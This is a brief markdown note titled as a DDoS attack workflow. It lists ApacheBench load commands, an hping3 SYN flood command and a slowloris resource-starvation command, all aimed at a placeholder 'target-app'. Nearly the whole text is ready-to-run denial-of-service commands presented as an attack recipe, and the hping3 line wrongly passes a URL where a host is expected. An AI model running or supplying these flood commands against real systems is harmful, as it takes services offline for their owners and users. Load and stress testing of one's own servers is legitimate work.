# Workflow: DDos Attack Using ab + hping3 + slowloris

For normal loads

``ab -n 100 -c 10 http://target-app/``

Push server loads

``ab -n 1000 -c 100 http://target-app/``

SYN Floods

``sudo hping3 -S -p 80 --flood http://target-app/``

Slowloris - Resource Starvation

``slowloris target-app -p 80 -s 500``